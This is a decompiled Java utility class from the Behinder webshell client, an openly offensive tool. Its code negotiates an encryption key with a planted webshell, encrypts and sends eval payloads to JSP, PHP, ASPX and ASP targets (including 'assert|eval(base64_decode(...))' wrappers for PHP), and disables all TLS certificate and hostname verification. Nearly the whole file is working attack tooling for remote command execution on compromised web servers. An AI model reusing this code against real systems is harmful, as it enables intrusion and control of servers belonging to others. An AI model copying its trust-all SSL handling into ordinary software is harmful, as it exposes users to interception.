// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.utils;

import javax.tools.FileObject;
import javax.tools.JavaFileManager;
import javax.tools.ForwardingJavaFileManager;
import java.net.InetAddress;
import java.net.UnknownHostException;
import javax.net.ssl.SSLSocket;
import java.net.Socket;
import java.io.IOException;
import java.net.URI;
import javax.tools.SimpleJavaFileObject;
import java.util.concurrent.ConcurrentHashMap;
import java.util.Date;
import java.text.SimpleDateFormat;
import java.sql.Timestamp;
import java.security.KeyManagementException;
import javax.net.ssl.SSLSession;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.KeyManager;
import java.security.SecureRandom;
import javax.net.ssl.SSLContext;
import java.security.cert.X509Certificate;
import javax.net.ssl.X509TrustManager;
import javax.net.ssl.TrustManager;
import java.security.NoSuchAlgorithmException;
import java.security.MessageDigest;
import java.lang.reflect.Method;
import java.lang.reflect.Field;
import java.util.zip.ZipEntry;
import java.util.Properties;
import java.util.zip.ZipInputStream;
import java.io.BufferedInputStream;
import java.util.zip.ZipFile;
import org.json.JSONObject;
import net.rebeyond.behinder.utils.jc.Run;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.StringSelection;
import java.awt.Toolkit;
import java.io.ByteArrayInputStream;
import java.util.ArrayList;
import java.io.FileInputStream;
import java.io.File;
import net.rebeyond.behinder.core.Params;
import java.util.LinkedHashMap;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import net.rebeyond.behinder.core.Crypt;
import java.io.DataInputStream;
import java.io.OutputStream;
import java.util.Iterator;
import java.util.Arrays;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.util.List;
import javax.net.ssl.HttpsURLConnection;
import java.net.Proxy;
import net.rebeyond.behinder.ui.controller.MainController;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.tools.JavaFileObject;
import java.util.Map;

public class Utils
{
    private static Map<String, JavaFileObject> fileObjects;
    
    public static boolean checkIP(final String ipAddress) {
        final String ip = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
        final Pattern pattern = Pattern.compile(ip);
        final Matcher matcher = pattern.matcher(ipAddress);
        return matcher.matches();
    }
    
    public static boolean checkPort(final String portTxt) {
        final String port = "([0-9]{1,5})";
        final Pattern pattern = Pattern.compile(port);
        final Matcher matcher = pattern.matcher(portTxt);
        return matcher.matches() && Integer.parseInt(portTxt) >= 1 && Integer.parseInt(portTxt) <= 65535;
    }
    
    public static Map<String, String> getKeyAndCookie(final String getUrl, final String password, final Map<String, String> requestHeaders) throws Exception {
        disableSslVerification();
        final Map<String, String> result = new HashMap<String, String>();
        final StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;
        URL url;
        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + new Random().nextInt(1000));
        }
        else {
            url = new URL(getUrl + "?" + password + "=" + new Random().nextInt(1000));
        }
        HttpURLConnection.setFollowRedirects(false);
        HttpURLConnection urlConnection;
        if (url.getProtocol().equals("https")) {
            if (MainController.currentProxy.get("proxy") != null) {
                final Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
                urlConnection = (HttpsURLConnection)url.openConnection(proxy);
            }
            else {
                urlConnection = (HttpsURLConnection)url.openConnection();
            }
        }
        else if (MainController.currentProxy.get("proxy") != null) {
            final Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
            urlConnection = (HttpURLConnection)url.openConnection(proxy);
        }
        else {
            urlConnection = (HttpURLConnection)url.openConnection();
        }
        for (final String headerName : requestHeaders.keySet()) {
            urlConnection.setRequestProperty(headerName, requestHeaders.get(headerName));
        }
        if (urlConnection.getResponseCode() == 302 || urlConnection.getResponseCode() == 301) {
            String urlwithSession = urlConnection.getHeaderFields().get("Location").get(0).toString();
            if (!urlwithSession.startsWith("http")) {
                urlwithSession = url.getProtocol() + "://" + url.getHost() + ":" + ((url.getPort() == -1) ? url.getDefaultPort() : url.getPort()) + urlwithSession;
                urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
            }
            result.put("urlWithSession", urlwithSession);
        }
        boolean error = false;
        String errorMsg = "";
        if (urlConnection.getResponseCode() == 500) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            final char[] buf = new char[512];
            int bytesRead = isr.read();
            final ByteArrayOutputStream bao = new ByteArrayOutputStream();
            while (bytesRead > 0) {
                bytesRead = isr.read(buf);
            }
            errorMsg = "\u5bc6\u94a5\u83b7\u53d6\u5931\u8d25,\u5bc6\u7801\u9519\u8bef?";
        }
        else if (urlConnection.getResponseCode() == 404) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            errorMsg = "\u9875\u9762\u8fd4\u56de404\u9519\u8bef";
        }
        else {
            isr = new InputStreamReader(urlConnection.getInputStream());
        }
        br = new BufferedReader(isr);
        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line);
        }
        br.close();
        if (error) {
            throw new Exception(errorMsg);
        }
        final String rawKey_1 = sb.toString();
        final String pattern = "[a-fA-F0-9]{16}";
        final Pattern r = Pattern.compile(pattern);
        final Matcher m = r.matcher(rawKey_1);
        if (!m.find()) {
            throw new Exception("\u9875\u9762\u5b58\u5728\uff0c\u4f46\u662f\u65e0\u6cd5\u83b7\u53d6\u5bc6\u94a5!");
        }
        int start = 0;
        int end = 0;
        int cycleCount = 0;
        while (true) {
            final Map<String, String> KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
            final String rawKey_2 = KeyAndCookie.get("key");
            final byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());
            int i = 0;
            while (i < temp.length) {
                if (temp[i] > 0) {
                    if (start == 0 || i <= start) {
                        start = i;
                        break;
                    }
                    break;
                }
                else {
                    ++i;
                }
            }
            i = temp.length - 1;
            while (i >= 0) {
                if (temp[i] > 0) {
                    if (i >= end) {
                        end = i + 1;
                        break;
                    }
                    break;
                }
                else {
                    --i;
                }
            }
            if (end - start == 16) {
                result.put("cookie", KeyAndCookie.get("cookie"));
                result.put("beginIndex", start + "");
                result.put("endIndex", temp.length - end + "");
                final String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
                result.put("key", finalKey);
                return result;
            }
            if (cycleCount > 10) {
                throw new Exception("Can't figure out the key!");
            }
            ++cycleCount;
        }
    }
    
    public static String getKey(final String password) throws Exception {
        return getMD5(password);
    }
    
    public static Map<String, String> getRawKey(final String getUrl, final String password, final Map<String, String> requestHeaders) throws Exception {
        final Map<String, String> result = new HashMap<String, String>();
        final StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;
        URL url;
        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + new Random().nextInt(1000));
        }
        else {
            url = new URL(getUrl + "?" + password + "=" + new Random().nextInt(1000));
        }
        HttpURLConnection.setFollowRedirects(false);
        HttpURLConnection urlConnection;
        if (url.getProtocol().equals("https")) {
            urlConnection = (HttpsURLConnection)url.openConnection();
        }
        else {
            urlConnection = (HttpURLConnection)url.openConnection();
        }
        for (final String headerName : requestHeaders.keySet()) {
            urlConnection.setRequestProperty(headerName, requestHeaders.get(headerName));
        }
        String cookieValues = "";
        final Map<String, List<String>> headers = urlConnection.getHeaderFields();
        for (final String headerName2 : headers.keySet()) {
            if (headerName2 == null) {
                continue;
            }
            if (headerName2.equalsIgnoreCase("Set-Cookie")) {
                for (String cookieValue : headers.get(headerName2)) {
                    cookieValue = cookieValue.replaceAll(";[\\s]*path=[\\s\\S]*;?", "");
                    cookieValues = cookieValues + ";" + cookieValue;
                }
                cookieValues = (cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues);
                break;
            }
        }
        result.put("cookie", cookieValues);
        boolean error = false;
        String errorMsg = "";
        if (urlConnection.getResponseCode() == 500) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            errorMsg = "\u5bc6\u94a5\u83b7\u53d6\u5931\u8d25,\u5bc6\u7801\u9519\u8bef?";
        }
        else if (urlConnection.getResponseCode() == 404) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            errorMsg = "\u9875\u9762\u8fd4\u56de404\u9519\u8bef";
        }
        else {
            isr = new InputStreamReader(urlConnection.getInputStream());
        }
        br = new BufferedReader(isr);
        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line);
        }
        br.close();
        if (error) {
            throw new Exception(errorMsg);
        }
        result.put("key", sb.toString());
        return result;
    }
    
    public static String sendPostRequest(final String urlPath, final String cookie, final String data) throws Exception {
        StringBuilder result = new StringBuilder();
        final URL url = new URL(urlPath);
        final HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }
        final OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data.getBytes());
        outwritestream.flush();
        outwritestream.close();
        if (conn.getResponseCode() == 200) {
            final BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null) {
                result = result.append(line + "\n");
            }
        }
        return result.toString();
    }
    
    public static Map<String, Object> requestAndParse(final String urlPath, final Map<String, String> header, final byte[] data, final int beginIndex, final int endIndex) throws Exception {
        final Map<String, Object> resultObj = sendPostRequestBinary(urlPath, header, data);
        byte[] resData = (byte[]) resultObj.get("data");
        if ((beginIndex != 0 || endIndex != 0) && resData.length - endIndex >= beginIndex) {
            resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
        }
        resultObj.put("data", resData);
        return resultObj;
    }
    
    public static Map<String, Object> sendPostRequestBinary(final String urlPath, final Map<String, String> header, final byte[] data) throws Exception {
        final Map<String, Object> result = new HashMap<String, Object>();
        final ByteArrayOutputStream bos = new ByteArrayOutputStream();
        final URL url = new URL(urlPath);
        HttpURLConnection conn;
        if (MainController.currentProxy.get("proxy") != null) {
            final Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
            conn = (HttpURLConnection)url.openConnection(proxy);
        }
        else {
            conn = (HttpURLConnection)url.openConnection();
        }
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        if (header != null) {
            final Object[] keys = header.keySet().toArray();
            Arrays.sort(keys);
            for (final Object key : keys) {
                conn.setRequestProperty(key.toString(), header.get(key));
            }
        }
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        final OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        if (conn.getResponseCode() == 200) {
            final DataInputStream din = new DataInputStream(conn.getInputStream());
            final byte[] buffer = new byte[1024];
            int length = 0;
            while ((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }
            final byte[] resData = bos.toByteArray();
            result.put("data", resData);
            final Map<String, String> responseHeader = new HashMap<String, String>();
            for (final String key2 : conn.getHeaderFields().keySet()) {
                responseHeader.put(key2, conn.getHeaderField(key2));
            }
            responseHeader.put("status", conn.getResponseCode() + "");
            result.put("header", responseHeader);
            return result;
        }
        final DataInputStream din = new DataInputStream(conn.getErrorStream());
        final byte[] buffer = new byte[1024];
        int length = 0;
        while ((length = din.read(buffer)) != -1) {
            bos.write(buffer, 0, length);
        }
        throw new Exception(new String(bos.toByteArray(), "GBK"));
    }
    
    public static String sendPostRequest(final String urlPath, final String cookie, final byte[] data) throws Exception {
        StringBuilder sb = new StringBuilder();
        final URL url = new URL(urlPath);
        final HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }
        final OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        if (conn.getResponseCode() == 200) {
            final BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null) {
                sb = sb.append(line + "\n");
            }
            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }
            return result;
        }
        final BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8"));
        String line;
        while ((line = reader.readLine()) != null) {
            sb = sb.append(line + "\n");
        }
        throw new Exception("\u8bf7\u6c42\u8fd4\u56de\u5f02\u5e38" + sb.toString());
    }
    
    public static String sendGetRequest(final String urlPath, final String cookie) throws Exception {
        StringBuilder sb = new StringBuilder();
        final URL url = new URL(urlPath);
        final HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestProperty("Content-Type", "text/plain");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }
        if (conn.getResponseCode() == 200) {
            final BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null) {
                sb = sb.append(line + "\n");
            }
            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }
            return result;
        }
        final BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8"));
        String line;
        while ((line = reader.readLine()) != null) {
            sb = sb.append(line + "\n");
        }
        throw new Exception("\u8bf7\u6c42\u8fd4\u56de\u5f02\u5e38" + sb.toString());
    }
    
    public static byte[] getEvalData(final String key, final int encryptType, final String type, final byte[] payload) throws Exception {
        byte[] result = null;
        if (type.equals("jsp")) {
            final byte[] encrypedBincls = Crypt.Encrypt(payload, key);
            final String basedEncryBincls = Base64.encode(encrypedBincls);
            result = basedEncryBincls.getBytes();
        }
        else if (type.equals("php")) {
            final byte[] bincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
            final byte[] encrypedBincls2 = Crypt.EncryptForPhp(bincls, key, encryptType);
            result = Base64.encode(encrypedBincls2).getBytes();
        }
        else if (type.equals("aspx")) {
            final Map<String, String> params = new LinkedHashMap<String, String>();
            params.put("code", new String(payload));
            result = getData(key, encryptType, "Eval", params, type);
        }
        else if (type.equals("asp")) {
            final byte[] encrypedBincls = result = Crypt.EncryptForAsp(payload, key);
        }
        return result;
    }
    
    public static byte[] getPluginData(final String key, final int encryptType, final String payloadPath, final Map<String, String> params, final String type) throws Exception {
        if (type.equals("jsp")) {
            final byte[] bincls = Params.getParamedClassForPlugin(payloadPath, params);
            return bincls;
        }
        if (type.equals("php")) {
            byte[] bincls = Params.getParamedPhp(payloadPath, params);
            bincls = Base64.encode(bincls).getBytes();
            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
            final byte[] encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            return Base64.encode(encrypedBincls).getBytes();
        }
        if (type.equals("aspx")) {
            final byte[] bincls = Params.getParamedAssembly(payloadPath, params);
            final byte[] encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
            return encrypedBincls;
        }
        if (type.equals("asp")) {
            final byte[] bincls = Params.getParamedAsp(payloadPath, params);
            final byte[] encrypedBincls = Crypt.EncryptForAsp(bincls, key);
            return encrypedBincls;
        }
        return null;
    }
    
    public static byte[] getData(final String key, final int encryptType, final String className, final Map<String, String> params, final String type) throws Exception {
        return getData(key, encryptType, className, params, type, null);
    }
    
    public static String map2Str(final Map<String, String> paramsMap) {
        String result = "";
        for (final String key : paramsMap.keySet()) {
            result = result + key + "^" + paramsMap.get(key) + "\n";
        }
        return result;
    }
    
    public static byte[] getData(final String key, final int encryptType, final String className, final Map<String, String> params, final String type, final byte[] extraData) throws Exception {
        if (type.equals("jsp")) {
            byte[] bincls = Params.getParamedClass(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
            }
            final byte[] encrypedBincls = Crypt.Encrypt(bincls, key);
            final String basedEncryBincls = Base64.encode(encrypedBincls);
            return basedEncryBincls.getBytes();
        }
        if (type.equals("php")) {
            byte[] bincls = Params.getParamedPhp(className, params);
            bincls = Base64.encode(bincls).getBytes();
            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
            }
            final byte[] encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            return Base64.encode(encrypedBincls).getBytes();
        }
        if (type.equals("aspx")) {
            byte[] bincls = Params.getParamedAssembly(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
            }
            final byte[] encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
            return encrypedBincls;
        }
        if (type.equals("asp")) {
            byte[] bincls = Params.getParamedAsp(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
            }
            final byte[] encrypedBincls = Crypt.EncryptForAsp(bincls, key);
            return encrypedBincls;
        }
        return null;
    }
    
    public static byte[] getFileData(final String filePath) throws Exception {
        byte[] fileContent = new byte[0];
        final FileInputStream fis = new FileInputStream(new File(filePath));
        final byte[] buffer = new byte[10240000];
        int length = 0;
        while ((length = fis.read(buffer)) > 0) {
            fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length));
        }
        fis.close();
        return fileContent;
    }
    
    public static List<byte[]> splitBytes(final byte[] content, final int size) throws Exception {
        final List<byte[]> result = new ArrayList<byte[]>();
        final byte[] buffer = new byte[size];
        final ByteArrayInputStream bis = new ByteArrayInputStream(content);
        int length = 0;
        while ((length = bis.read(buffer)) > 0) {
            result.add(Arrays.copyOfRange(buffer, 0, length));
        }
        bis.close();
        return result;
    }
    
    public static void setClipboardString(final String text) {
        final Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        final Transferable trans = new StringSelection(text);
        clipboard.setContents(trans, null);
    }
    
    public static byte[] getResourceData(final String filePath) throws Exception {
        final InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
        final ByteArrayOutputStream bos = new ByteArrayOutputStream();
        final byte[] buffer = new byte[102400];
        int num = 0;
        while ((num = is.read(buffer)) != -1) {
            bos.write(buffer, 0, num);
            bos.flush();
        }
        is.close();
        return bos.toByteArray();
    }
    
    public static byte[] ascii2unicode(final String str, final int type) throws Exception {
        final ByteArrayOutputStream buf = new ByteArrayOutputStream();
        final DataOutputStream out = new DataOutputStream(buf);
        for (final byte b : str.getBytes()) {
            out.writeByte(b);
            out.writeByte(0);
        }
        if (type == 1) {
            out.writeChar(0);
        }
        return buf.toByteArray();
    }
    
    public static byte[] mergeBytes(final byte[] a, final byte[] b) throws Exception {
        final ByteArrayOutputStream output = new ByteArrayOutputStream();
        output.write(a);
        output.write(b);
        return output.toByteArray();
    }
    
    public static byte[] getClassFromSourceCode(final String sourceCode) throws Exception {
        return Run.getClassFromSourceCode(sourceCode);
    }
    
    public static String getSelfPath() throws Exception {
        String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        currentPath = new File(currentPath).getCanonicalPath();
        return currentPath;
    }
    
    public static JSONObject parsePluginZip(final String zipFilePath) throws Exception {
        final String pluginRootPath = getSelfPath() + "/Plugins";
        String pluginName = "";
        final ZipFile zf = new ZipFile(zipFilePath);
        final InputStream in = new BufferedInputStream(new FileInputStream(zipFilePath));
        final ZipInputStream zin = new ZipInputStream(in);
        ZipEntry ze;
        while ((ze = zin.getNextEntry()) != null) {
            if (ze.getName().equals("plugin.config")) {
                final BufferedReader br = new BufferedReader(new InputStreamReader(zf.getInputStream(ze)));
                final Properties pluginConfig = new Properties();
                pluginConfig.load(br);
                pluginName = pluginConfig.getProperty("name");
                br.close();
            }
        }
        zin.closeEntry();
        final String pluginPath = pluginRootPath + "/" + pluginName;
        ZipUtil.unZipFiles(zipFilePath, pluginPath);
        final FileInputStream fis = new FileInputStream(pluginPath + "/plugin.config");
        final Properties pluginConfig2 = new Properties();
        pluginConfig2.load(fis);
        final JSONObject pluginEntity = new JSONObject();
        pluginEntity.put("name", (Object)pluginName);
        pluginEntity.put("version", (Object)pluginConfig2.getProperty("version", "v1.0"));
        pluginEntity.put("entryFile", (Object)pluginConfig2.getProperty("entry", "index.htm"));
        pluginEntity.put("icon", (Object)pluginConfig2.getProperty("icon", "/Users/rebeyond/host.png"));
        pluginEntity.put("scriptType", (Object)pluginConfig2.getProperty("scriptType"));
        pluginEntity.put("isGetShell", (Object)pluginConfig2.getProperty("isGetShell"));
        pluginEntity.put("type", (Object)pluginConfig2.getProperty("type"));
        pluginEntity.put("author", (Object)pluginConfig2.getProperty("author"));
        pluginEntity.put("link", (Object)pluginConfig2.getProperty("link"));
        pluginEntity.put("qrcode", (Object)pluginConfig2.getProperty("qrcode"));
        pluginEntity.put("comment", (Object)pluginConfig2.getProperty("comment"));
        return pluginEntity;
    }
    
    public static <T> T json2Obj(final JSONObject json, final Class target) throws Exception {
        final Object obj = target.newInstance();
        for (final Field f : target.getDeclaredFields()) {
            try {
                final String filedName = f.getName();
                final String setName = "set" + filedName.substring(0, 1).toUpperCase() + filedName.substring(1);
                final Method m = target.getMethod(setName, String.class);
                m.invoke(obj, json.get(filedName).toString());
            }
            catch (Exception e) {}
        }
        return (T)obj;
    }
    
    public static String getMD5(final String input) throws NoSuchAlgorithmException {
        if (input == null || input.length() == 0) {
            return null;
        }
        final MessageDigest md5 = MessageDigest.getInstance("MD5");
        md5.update(input.getBytes());
        final byte[] byteArray = md5.digest();
        final StringBuilder sb = new StringBuilder();
        for (final byte b : byteArray) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString().substring(0, 16);
    }
    
    public static void main(final String[] args) {
        final String sourceCode = "package net.rebeyond.behinder.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";
        try {
            getClassFromSourceCode(sourceCode);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static void disableSslVerification() {
        try {
            final TrustManager[] trustAllCerts = { new X509TrustManager() {
                    @Override
                    public X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }
                    
                    @Override
                    public void checkClientTrusted(final X509Certificate[] certs, final String authType) {
                    }
                    
                    @Override
                    public void checkServerTrusted(final X509Certificate[] certs, final String authType) {
                    }
                } };
            final SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new SecureRandom());
            final List<String> cipherSuites = new ArrayList<String>();
            for (final String cipher : sc.getSupportedSSLParameters().getCipherSuites()) {
                if (cipher.indexOf("_DHE_") < 0 && cipher.indexOf("_DH_") < 0) {
                    cipherSuites.add(cipher);
                }
            }
            HttpsURLConnection.setDefaultSSLSocketFactory(new MySSLSocketFactory(sc.getSocketFactory(), (String[])cipherSuites.toArray(new String[0])));
            final HostnameVerifier allHostsValid = new HostnameVerifier() {
                @Override
                public boolean verify(final String hostname, final SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        }
        catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        catch (KeyManagementException e2) {
            e2.printStackTrace();
        }
    }
    
    public static Map<String, String> jsonToMap(final JSONObject obj) {
        final Map<String, String> result = new HashMap<String, String>();
        for (final String key : obj.keySet()) {
            result.put(key, (String)obj.get(key));
        }
        return result;
    }
    
    public static Timestamp stringToTimestamp(final String timeString) {
        Timestamp timestamp = null;
        try {
            final SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss.SSS");
            final Date parsedDate = dateFormat.parse(timeString);
            timestamp = new Timestamp(parsedDate.getTime());
        }
        catch (Exception ex) {}
        return timestamp;
    }
    
    public static String getRandomString(final int length) {
        final String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        final Random random = new Random();
        final StringBuffer sb = new StringBuffer();
        for (int i = 0; i < length; ++i) {
            final int number = random.nextInt(62);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }
    
    static {
        Utils.fileObjects = new ConcurrentHashMap<String, JavaFileObject>();
    }
    
    public static class MyJavaFileObject extends SimpleJavaFileObject
    {
        private String source;
        private ByteArrayOutputStream outPutStream;
        
        public MyJavaFileObject(final String name, final String source) {
            super(URI.create("String:///" + name + Kind.SOURCE.extension), Kind.SOURCE);
            this.source = source;
        }
        
        public MyJavaFileObject(final String name, final Kind kind) {
            super(URI.create("String:///" + name + kind.extension), kind);
            this.source = null;
        }
        
        @Override
        public CharSequence getCharContent(final boolean ignoreEncodingErrors) {
            if (this.source == null) {
                throw new IllegalArgumentException("source == null");
            }
            return this.source;
        }
        
        @Override
        public OutputStream openOutputStream() throws IOException {
            return this.outPutStream = new ByteArrayOutputStream();
        }
        
        public byte[] getCompiledBytes() {
            return this.outPutStream.toByteArray();
        }
    }
    
    private static class MySSLSocketFactory extends SSLSocketFactory
    {
        private SSLSocketFactory sf;
        private String[] enabledCiphers;
        
        private MySSLSocketFactory(final SSLSocketFactory sf, final String[] enabledCiphers) {
            this.sf = null;
            this.enabledCiphers = null;
            this.sf = sf;
            this.enabledCiphers = enabledCiphers;
        }
        
        private Socket getSocketWithEnabledCiphers(final Socket socket) {
            if (this.enabledCiphers != null && socket != null && socket instanceof SSLSocket) {
                ((SSLSocket)socket).setEnabledCipherSuites(this.enabledCiphers);
            }
            return socket;
        }
        
        @Override
        public Socket createSocket(final Socket s, final String host, final int port, final boolean autoClose) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(s, host, port, autoClose));
        }
        
        @Override
        public String[] getDefaultCipherSuites() {
            return this.sf.getDefaultCipherSuites();
        }
        
        @Override
        public String[] getSupportedCipherSuites() {
            if (this.enabledCiphers == null) {
                return this.sf.getSupportedCipherSuites();
            }
            return this.enabledCiphers;
        }
        
        @Override
        public Socket createSocket(final String host, final int port) throws IOException, UnknownHostException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port));
        }
        
        @Override
        public Socket createSocket(final InetAddress address, final int port) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port));
        }
        
        @Override
        public Socket createSocket(final String host, final int port, final InetAddress localAddress, final int localPort) throws IOException, UnknownHostException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port, localAddress, localPort));
        }
        
        @Override
        public Socket createSocket(final InetAddress address, final int port, final InetAddress localaddress, final int localport) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
        }
    }
    
    public static class MyJavaFileManager extends ForwardingJavaFileManager<JavaFileManager>
    {
        protected MyJavaFileManager(final JavaFileManager fileManager) {
            super(fileManager);
        }
        
        @Override
        public JavaFileObject getJavaFileForInput(final Location location, final String className, final JavaFileObject.Kind kind) throws IOException {
            final JavaFileObject javaFileObject = Utils.fileObjects.get(className);
            if (javaFileObject == null) {
                super.getJavaFileForInput(location, className, kind);
            }
            return javaFileObject;
        }
        
        @Override
        public JavaFileObject getJavaFileForOutput(final Location location, final String qualifiedClassName, final JavaFileObject.Kind kind, final FileObject sibling) throws IOException {
            final JavaFileObject javaFileObject = new MyJavaFileObject(qualifiedClassName, kind);
            Utils.fileObjects.put(qualifiedClassName, javaFileObject);
            return javaFileObject;
        }
    }
}
